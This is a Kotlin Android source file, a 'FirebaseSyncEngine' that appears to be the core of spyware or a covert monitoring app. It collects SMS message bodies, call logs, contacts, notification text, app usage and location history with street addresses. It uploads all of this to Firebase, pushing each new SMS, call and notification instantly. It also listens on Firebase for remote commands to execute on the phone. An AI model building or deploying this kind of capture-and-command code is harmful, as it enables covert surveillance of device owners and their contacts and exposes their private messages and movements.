package com.example.data.sync

import android.app.ActivityManager
import android.content.Context
import android.location.Geocoder
import android.os.Build
import android.provider.Settings
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.example.data.local.AppDatabase
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class FirebaseSyncEngine(private val context: Context) {

    private val db = AppDatabase.getInstance(context)
    val deviceId: String by lazy {
        try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
        } catch (_: Exception) {
            "DEVICE_${Build.MODEL}"
        }
    }

    private fun formatTimestamp(timestampMs: Long): String {
        return try {
            val sdf = SimpleDateFormat("MMM dd, yyyy, hh:mm a", Locale.US)
            sdf.format(Date(timestampMs))
        } catch (_: Exception) {
            ""
        }
    }

    private fun formatDuration(durationSeconds: Long): String {
        val mins = durationSeconds / 60
        val secs = durationSeconds % 60
        return if (mins > 0) "${mins}m ${secs}s" else "${secs}s"
    }

    private fun formatAppTime(totalMs: Long): String {
        val mins = totalMs / (1000 * 60)
        val hrs = mins / 60
        val remMins = mins % 60
        return if (hrs > 0) "${hrs}h ${remMins}m" else "${remMins}m"
    }

    private fun getAddressDetails(lat: Double, lng: Double): Map<String, String> {
        if (lat == 0.0 && lng == 0.0) {
            return mapOf(
                "address" to "No Location Fix",
                "city" to "N/A",
                "state" to "N/A",
                "country" to "N/A",
                "postalCode" to "N/A"
            )
        }
        return try {
            val geocoder = Geocoder(context, Locale.getDefault())
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses.first()
                mapOf(
                    "address" to (addr.getAddressLine(0) ?: "$lat, $lng"),
                    "city" to (addr.locality ?: addr.subAdminArea ?: ""),
                    "state" to (addr.adminArea ?: ""),
                    "country" to (addr.countryName ?: ""),
                    "postalCode" to (addr.postalCode ?: "")
                )
            } else {
                mapOf(
                    "address" to "$lat, $lng",
                    "city" to "",
                    "state" to "",
                    "country" to "",
                    "postalCode" to ""
                )
            }
        } catch (_: Exception) {
            mapOf(
                "address" to "$lat, $lng",
                "city" to "",
                "state" to "",
                "country" to "",
                "postalCode" to ""
            )
        }
    }

    private fun getRamUsageFormatted(): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am?.getMemoryInfo(memInfo)
            if (memInfo != null) {
                val availGb = memInfo.availMem / (1024.0 * 1024.0 * 1024.0)
                val totalGb = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
                String.format(Locale.US, "%.1f GB / %.1f GB", availGb, totalGb)
            } else {
                "N/A"
            }
        } catch (_: Exception) {
            "N/A"
        }
    }

    suspend fun clearAllRemoteData(): Boolean = withContext(Dispatchers.IO) {
        var success = true
        try {
            val rtdb = FirebaseDatabase.getInstance()
            rtdb.getReference("devices/$deviceId/sms").removeValue()
            rtdb.getReference("devices/$deviceId/calls").removeValue()
            rtdb.getReference("devices/$deviceId/contacts").removeValue()
            rtdb.getReference("devices/$deviceId/notifications").removeValue()
            rtdb.getReference("devices/$deviceId/app_usage").removeValue()
            rtdb.getReference("devices/$deviceId/location").removeValue()
            Log.d("FirebaseSyncEngine", "Successfully cleared Realtime Database for $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error clearing RTDB: ${e.message}")
            success = false
        }

        try {
            val firestore = FirebaseFirestore.getInstance()
            val deviceRef = firestore.collection("enterprise_devices").document(deviceId)
            val collections = listOf("sms_logs", "call_logs", "contacts", "notifications", "app_usage", "locations")
            collections.forEach { col ->
                deviceRef.collection(col).get().addOnSuccessListener { snapshot ->
                    snapshot.documents.forEach { doc -> doc.reference.delete() }
                }
            }
            Log.d("FirebaseSyncEngine", "Successfully cleared Firestore subcollections for $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error clearing Firestore: ${e.message}")
        }

        try {
            db.smsDao().clearAll()
            db.callLogDao().clearAll()
            db.contactDao().clearAll()
            db.notificationDao().clearAll()
            db.appUsageDao().clearAll()
            db.locationDao().clearAll()
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error clearing local DB: ${e.message}")
        }

        success
    }

    suspend fun pushTelemetryToFirebase(clearFirst: Boolean = false): Boolean = withContext(Dispatchers.IO) {
        if (clearFirst) {
            clearAllRemoteData()
        }

        var firestoreSuccess = false
        var rtdbSuccess = false

        // Sync local data providers into Room DB right before upload
        try { CallLogSyncManager(context).syncCallLogs() } catch (_: Exception) {}
        try { AppUsageSyncManager(context).syncAppUsageStats() } catch (_: Exception) {}
        try { SmsSyncManager(context).syncSmsMessages() } catch (_: Exception) {}
        try { ContactsSyncManager(context).syncContacts() } catch (_: Exception) {}

        // Fetch all local synced records from Room DB
        val smsList = try { db.smsDao().getAllSmsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading SMS: ${e.message}"); emptyList() }
        val callLogs = try { db.callLogDao().getAllCallLogsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Calls: ${e.message}"); emptyList() }
        val contacts = try { db.contactDao().getAllContactsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Contacts: ${e.message}"); emptyList() }
        val notifications = try { db.notificationDao().getAllNotificationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Notifications: ${e.message}"); emptyList() }
        val appUsage = try { db.appUsageDao().getAllAppUsageSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Usage: ${e.message}"); emptyList() }
        val locationList = try { db.locationDao().getAllLocationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Locations: ${e.message}"); emptyList() }
        val deviceInfoSyncManager = DeviceInfoSyncManager(context)
        val deviceInfoMap = try { deviceInfoSyncManager.syncDeviceInfo().getOrNull() ?: emptyMap() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading DeviceInfo: ${e.message}"); emptyMap() }
        val deviceInfo = try { deviceInfoSyncManager.collectAndSyncDeviceInfo() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error saving DeviceInfoEntity: ${e.message}"); null }
        val location = try { LocationSyncManager(context).captureAndSyncLocation() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Location: ${e.message}"); null }

        val timestamp = System.currentTimeMillis()

        val freeStorageGb = (deviceInfoMap["freeStorageGb"] as? Double)
            ?: ((deviceInfo?.freeStorageMb ?: 0) / 1024.0)
        val totalStorageGb = (deviceInfoMap["totalStorageGb"] as? Double)
            ?: ((deviceInfo?.totalStorageMb ?: 0) / 1024.0)
        val storageFormatted = if (totalStorageGb > 0) {
            String.format(Locale.US, "%.2f GB free of %.2f GB", freeStorageGb, totalStorageGb)
        } else "N/A"

        val deviceInfoPayload = mutableMapOf<String, Any>().apply {
            putAll(deviceInfoMap)
            put("brand", Build.BRAND)
            put("storageAvailableFormatted", storageFormatted)
            put("ramAvailableFormatted", getRamUsageFormatted())
            put("isRooted", false)
            put("lastSyncTimestamp", timestamp)
            put("batteryStatus", if ((deviceInfoMap["isCharging"] as? Boolean) == true) "Charging" else "Discharging")
            put("wifiConnected", (deviceInfoMap["isWifiConnected"] as? Boolean) ?: false)
            put("wifiState", (deviceInfoMap["wifiState"] as? String) ?: "UNKNOWN")
        }

        val currentLat = location?.latitude ?: 0.0
        val currentLng = location?.longitude ?: 0.0
        val addressMap = getAddressDetails(currentLat, currentLng)

        val currentLocationPayload = mapOf(
            "latitude" to currentLat,
            "longitude" to currentLng,
            "accuracy" to (location?.accuracy ?: 0.0f),
            "altitude" to (location?.altitude ?: 0.0),
            "bearing" to (location?.bearing ?: 0.0f),
            "speed" to (location?.speed ?: 0.0f),
            "provider" to (location?.provider ?: "N/A"),
            "timestamp" to (location?.timestamp ?: timestamp),
            "formattedTime" to formatTimestamp(location?.timestamp ?: timestamp),
            "address" to (addressMap["address"] ?: "$currentLat, $currentLng"),
            "city" to (addressMap["city"] ?: ""),
            "state" to (addressMap["state"] ?: ""),
            "country" to (addressMap["country"] ?: ""),
            "postalCode" to (addressMap["postalCode"] ?: "")
        )

        // 1. Sync to Firebase Firestore
        try {
            val firestore = FirebaseFirestore.getInstance()
            val deviceRef = firestore.collection("enterprise_devices").document(deviceId)
            deviceRef.set(deviceInfoPayload)

            // Push SMS subcollection
            smsList.forEach { sms ->
                val typeInt = if (sms.type.contains("OUT", ignoreCase = true) || sms.type == "2") 2 else 1
                deviceRef.collection("sms_logs").document(sms.id.toString()).set(
                    mapOf(
                        "id" to sms.id,
                        "address" to sms.address,
                        "body" to sms.messageBody,
                        "date" to sms.timestamp,
                        "formattedDate" to formatTimestamp(sms.timestamp),
                        "type" to typeInt,
                        "read" to false
                    )
                )
            }

            // Push Call Logs subcollection
            callLogs.forEach { call ->
                deviceRef.collection("call_logs").document(call.id.toString()).set(
                    mapOf(
                        "id" to call.id,
                        "number" to call.number,
                        "name" to call.name,
                        "typeString" to call.type,
                        "formattedDate" to formatTimestamp(call.timestamp),
                        "formattedDuration" to formatDuration(call.durationSeconds),
                        "duration" to call.durationSeconds
                    )
                )
            }

            // Push Contacts subcollection
            contacts.forEach { contact ->
                val docKey = if (contact.contactId.isNotBlank()) "contact_${contact.contactId}" else contact.id.toString()
                deviceRef.collection("contacts").document(docKey).set(
                    mapOf(
                        "name" to contact.displayName,
                        "phoneNumbers" to contact.getPhoneNumbersList(),
                        "emails" to contact.getEmailsList(),
                        "notes" to contact.notes,
                        "starred" to contact.starred
                    )
                )
            }

            // Push Notifications subcollection
            notifications.forEach { notif ->
                deviceRef.collection("notifications").document(notif.id.toString()).set(
                    mapOf(
                        "id" to notif.id,
                        "appName" to notif.packageName.substringAfterLast(".").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
                        "packageName" to notif.packageName,
                        "title" to notif.title,
                        "text" to notif.text,
                        "formattedTime" to formatTimestamp(notif.timestamp)
                    )
                )
            }

            // Push App Usage subcollection
            appUsage.forEach { usage ->
                deviceRef.collection("app_usage").document(usage.id.toString()).set(
                    mapOf(
                        "id" to usage.id,
                        "appName" to usage.appName,
                        "packageName" to usage.packageName,
                        "formattedTime" to formatAppTime(usage.totalTimeInForegroundMs),
                        "totalTimeInForegroundMs" to usage.totalTimeInForegroundMs,
                        "formattedLastTimeUsed" to formatTimestamp(usage.lastTimeUsed)
                    )
                )
            }

            // Push Location history subcollection
            locationList.forEach { loc ->
                val locAddr = getAddressDetails(loc.latitude, loc.longitude)
                deviceRef.collection("locations").document(loc.id.toString()).set(
                    mapOf(
                        "id" to loc.id,
                        "latitude" to loc.latitude,
                        "longitude" to loc.longitude,
                        "accuracy" to loc.accuracy,
                        "altitude" to loc.altitude,
                        "bearing" to loc.bearing,
                        "speed" to loc.speed,
                        "provider" to loc.provider,
                        "timestamp" to loc.timestamp,
                        "formattedTime" to formatTimestamp(loc.timestamp),
                        "address" to (locAddr["address"] ?: "${loc.latitude}, ${loc.longitude}"),
                        "city" to (locAddr["city"] ?: ""),
                        "state" to (locAddr["state"] ?: ""),
                        "country" to (locAddr["country"] ?: ""),
                        "postalCode" to (locAddr["postalCode"] ?: "")
                    )
                )
            }

            firestoreSuccess = true
            Log.d("FirebaseSyncEngine", "Firestore sync complete for device $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Firestore sync failed: ${e.message}", e)
        }

        // 2. Sync to Firebase Realtime Database
        try {
            val rtdb = FirebaseDatabase.getInstance()

            // Device Info
            rtdb.getReference(FirebaseConstants.getDeviceInfoPath(deviceId)).setValue(deviceInfoPayload)

            // Location Current
            rtdb.getReference(FirebaseConstants.getLocationCurrentPath(deviceId)).setValue(currentLocationPayload)

            // Location History
            val locHistRef = rtdb.getReference("devices/$deviceId/location/history/$timestamp")
            locHistRef.setValue(currentLocationPayload)

            // SMS Messages
            if (smsList.isNotEmpty()) {
                val smsRef = rtdb.getReference(FirebaseConstants.getSmsPath(deviceId))
                val smsMap = mutableMapOf<String, Any>()
                smsList.forEach { sms ->
                    val key = "sms_${sms.timestamp}_${sms.address.hashCode()}"
                    val typeInt = if (sms.type.contains("OUT", ignoreCase = true) || sms.type == "2") 2 else 1
                    smsMap[key] = mapOf(
                        "address" to sms.address,
                        "body" to sms.messageBody,
                        "date" to sms.timestamp,
                        "formattedDate" to formatTimestamp(sms.timestamp),
                        "type" to typeInt,
                        "read" to false
                    )
                }
                smsRef.setValue(smsMap)
            }

            // Call Logs
            if (callLogs.isNotEmpty()) {
                val callsRef = rtdb.getReference(FirebaseConstants.getCallsPath(deviceId))
                val callsMap = mutableMapOf<String, Any>()
                callLogs.forEach { call ->
                    val key = "call_${call.timestamp}_${call.number.hashCode()}"
                    callsMap[key] = mapOf(
                        "number" to call.number,
                        "name" to call.name,
                        "typeString" to call.type,
                        "formattedDate" to formatTimestamp(call.timestamp),
                        "formattedDuration" to formatDuration(call.durationSeconds),
                        "duration" to call.durationSeconds
                    )
                }
                callsRef.setValue(callsMap)
            }

            // Contacts
            if (contacts.isNotEmpty()) {
                val contactsRef = rtdb.getReference(FirebaseConstants.getContactsPath(deviceId))
                val contactsMap = mutableMapOf<String, Any>()
                contacts.forEach { c ->
                    val key = if (c.contactId.isNotBlank()) "contact_${c.contactId}" else "c_${c.id}"
                    contactsMap[key] = mapOf(
                        "name" to c.displayName,
                        "phoneNumbers" to c.getPhoneNumbersList(),
                        "emails" to c.getEmailsList(),
                        "notes" to c.notes,
                        "starred" to c.starred
                    )
                }
                contactsRef.setValue(contactsMap)
            }

            // Notifications
            if (notifications.isNotEmpty()) {
                val notifRef = rtdb.getReference(FirebaseConstants.getNotificationsPath(deviceId))
                val notifMap = mutableMapOf<String, Any>()
                notifications.forEach { n ->
                    val key = "notif_${n.timestamp}_${n.packageName.hashCode()}"
                    notifMap[key] = mapOf(
                        "appName" to n.packageName.substringAfterLast(".").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
                        "packageName" to n.packageName,
                        "title" to n.title,
                        "text" to n.text,
                        "formattedTime" to formatTimestamp(n.timestamp)
                    )
                }
                notifRef.setValue(notifMap)
            }

            // App Usage
            if (appUsage.isNotEmpty()) {
                val usageRef = rtdb.getReference(FirebaseConstants.getAppUsagePath(deviceId))
                appUsage.forEach { u ->
                    val pkgKey = u.packageName.replace(".", "_")
                    usageRef.child(pkgKey).setValue(
                        mapOf(
                            "appName" to u.appName,
                            "packageName" to u.packageName,
                            "formattedTime" to formatAppTime(u.totalTimeInForegroundMs),
                            "totalTimeInForegroundMs" to u.totalTimeInForegroundMs,
                            "formattedLastTimeUsed" to formatTimestamp(u.lastTimeUsed)
                        )
                    )
                }
            }

            rtdbSuccess = true
            Log.d("FirebaseSyncEngine", "Realtime Database sync complete for device $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Realtime Database sync failed: ${e.message}", e)
        }

        firestoreSuccess || rtdbSuccess
    }

    fun uploadSingleSmsInstant(address: String, body: String, timestamp: Long) {
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val smsRef = rtdb.getReference(FirebaseConstants.getSmsPath(deviceId)).push()
            val payload = mapOf(
                "address" to address,
                "body" to body,
                "date" to timestamp,
                "formattedDate" to formatTimestamp(timestamp),
                "type" to 1,
                "read" to false
            )
            smsRef.setValue(payload)
            Log.d("FirebaseSyncEngine", "Instant SMS uploaded to Realtime Database for $address")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Instant SMS upload error: ${e.message}")
        }
    }

    fun uploadSingleCallInstant(number: String, name: String, type: String, duration: Long, timestamp: Long) {
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val callRef = rtdb.getReference(FirebaseConstants.getCallsPath(deviceId)).push()
            val payload = mapOf(
                "number" to number,
                "name" to name,
                "type" to type,
                "durationSeconds" to duration,
                "timestamp" to timestamp,
                "formattedDate" to formatTimestamp(timestamp),
                "formattedDuration" to formatDuration(duration)
            )
            callRef.setValue(payload)
            Log.d("FirebaseSyncEngine", "Instant Call uploaded to Realtime Database for $number")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Instant Call upload error: ${e.message}")
        }
    }

    fun uploadSingleNotificationInstant(packageName: String, title: String, text: String, timestamp: Long) {
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val notifRef = rtdb.getReference(FirebaseConstants.getNotificationsPath(deviceId)).push()
            val payload = mapOf(
                "packageName" to packageName,
                "title" to title,
                "text" to text,
                "timestamp" to timestamp,
                "formattedTime" to formatTimestamp(timestamp)
            )
            notifRef.setValue(payload)
            Log.d("FirebaseSyncEngine", "Instant Notification uploaded to Realtime Database for $packageName")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Instant Notification upload error: ${e.message}")
        }
    }

    fun startCommandListener(onCommandReceived: (commandId: String, commandType: String, params: Map<String, Any>) -> Unit) {
        // 1. Realtime Database Listener & Initial Fetch
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val commandsRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId))
            
            val listener = object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    processCommandSnapshot(snapshot, onCommandReceived)
                }

                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                    processCommandSnapshot(snapshot, onCommandReceived)
                }

                override fun onChildRemoved(snapshot: DataSnapshot) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: DatabaseError) {}
            }
            commandsRef.addChildEventListener(listener)
            
            // Also fetch once immediately to catch any commands present before listener attached
            commandsRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    for (child in snapshot.children) {
                        processCommandSnapshot(child, onCommandReceived)
                    }
                }
                override fun onCancelled(error: DatabaseError) {}
            })
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error starting RTDB command listener: ${e.message}")
        }

        // 2. Firestore Listener & Initial Get (both enterprise_devices and devices collections)
        try {
            val firestore = FirebaseFirestore.getInstance()
            val paths = listOf("enterprise_devices/$deviceId/commands", "devices/$deviceId/commands")
            paths.forEach { path ->
                firestore.collection(path).get().addOnSuccessListener { querySnapshot ->
                    if (querySnapshot != null) {
                        for (doc in querySnapshot.documents) {
                            processFirestoreDocument(doc, onCommandReceived)
                        }
                    }
                }

                firestore.collection(path).addSnapshotListener { snapshot, error ->
                    if (error != null || snapshot == null) return@addSnapshotListener
                    for (docChange in snapshot.documentChanges) {
                        if (docChange.type == com.google.firebase.firestore.DocumentChange.Type.ADDED ||
                            docChange.type == com.google.firebase.firestore.DocumentChange.Type.MODIFIED) {
                            processFirestoreDocument(docChange.document, onCommandReceived)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error starting Firestore command listener: ${e.message}")
        }
    }

    private fun processFirestoreDocument(doc: com.google.firebase.firestore.DocumentSnapshot, onCommandReceived: (String, String, Map<String, Any>) -> Unit) {
        try {
            val data = doc.data ?: return
            val statusStr = data["status"]?.toString()?.uppercase() ?: "PENDING"
            val executed = data["executed"] as? Boolean ?: false

            val isActionable = !executed && statusStr != "COMPLETED" && statusStr != "FAILED" && statusStr != "SUCCESS"
            if (isActionable) {
                val commandType = (data["command"] as? String)
                    ?: (data["commandType"] as? String)
                    ?: (data["type"] as? String)
                    ?: (data["action"] as? String)
                    ?: (data["name"] as? String)
                    ?: return

                val paramsMap = mutableMapOf<String, Any>()
                data.forEach { (k, v) ->
                    if (v != null && k !in listOf("status", "result", "executed", "timestamp")) {
                        paramsMap[k] = v
                    }
                }
                (data["params"] as? Map<*, *>)?.forEach { (k, v) ->
                    if (k != null && v != null) paramsMap[k.toString()] = v
                }
                (data["data"] as? Map<*, *>)?.forEach { (k, v) ->
                    if (k != null && v != null) paramsMap[k.toString()] = v
                }
                (data["payload"] as? Map<*, *>)?.forEach { (k, v) ->
                    if (k != null && v != null) paramsMap[k.toString()] = v
                }

                doc.reference.update(mapOf("status" to "EXECUTING", "executed" to true))
                onCommandReceived("fs_${doc.id}", commandType, paramsMap)
            }
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error processing Firestore document: ${e.message}")
        }
    }

    private fun processCommandSnapshot(snapshot: DataSnapshot, onCommandReceived: (String, String, Map<String, Any>) -> Unit) {
        try {
            val pushId = snapshot.key ?: return
            val statusVal = snapshot.child("status").value
            val statusStr = statusVal?.toString()?.uppercase() ?: "PENDING"
            val executed = snapshot.child("executed").getValue(Boolean::class.java) == true

            val isActionable = !executed && statusStr != "COMPLETED" && statusStr != "FAILED" && statusStr != "SUCCESS"
            if (isActionable) {
                val commandType = snapshot.child("command").getValue(String::class.java)
                    ?: snapshot.child("commandType").getValue(String::class.java)
                    ?: snapshot.child("type").getValue(String::class.java)
                    ?: snapshot.child("action").getValue(String::class.java)
                    ?: snapshot.child("name").getValue(String::class.java)
                    ?: return

                val paramsMap = mutableMapOf<String, Any>()

                snapshot.children.forEach { child ->
                    val k = child.key ?: return@forEach
                    val v = child.value ?: return@forEach
                    if (k !in listOf("status", "result", "executed", "timestamp", "createdAt", "executedAt")) {
                        paramsMap[k] = v
                    }
                }

                listOf("params", "data", "payload", "args").forEach { subKey ->
                    snapshot.child(subKey).children.forEach { child ->
                        child.key?.let { k -> child.value?.let { v -> paramsMap[k] = v } }
                    }
                }

                snapshot.ref.child("status").setValue("EXECUTING")
                snapshot.ref.child("executed").setValue(true)

                onCommandReceived(pushId, commandType, paramsMap)
            }
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error processing command snapshot: ${e.message}")
        }
    }

    fun updateCommandStatus(pushId: String, status: String, result: String = "") {
        try {
            if (pushId.startsWith("fs_")) {
                val docId = pushId.removePrefix("fs_")
                val firestore = FirebaseFirestore.getInstance()
                val updateData = mutableMapOf<String, Any>(
                    "status" to status,
                    "executed" to (status == "COMPLETED" || status == "FAILED"),
                    "executedAt" to System.currentTimeMillis()
                )
                if (result.isNotBlank()) updateData["result"] = result

                firestore.collection("enterprise_devices/$deviceId/commands").document(docId).update(updateData)
                firestore.collection("devices/$deviceId/commands").document(docId).update(updateData)
            } else {
                val rtdb = FirebaseDatabase.getInstance()
                val cmdRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId)).child(pushId)
                cmdRef.child("status").setValue(status)
                cmdRef.child("executed").setValue(status == "COMPLETED" || status == "FAILED")
                cmdRef.child("executedAt").setValue(System.currentTimeMillis())
                if (result.isNotBlank()) {
                    cmdRef.child("result").setValue(result)
                }
            }
        } catch (_: Exception) {}
    }
}
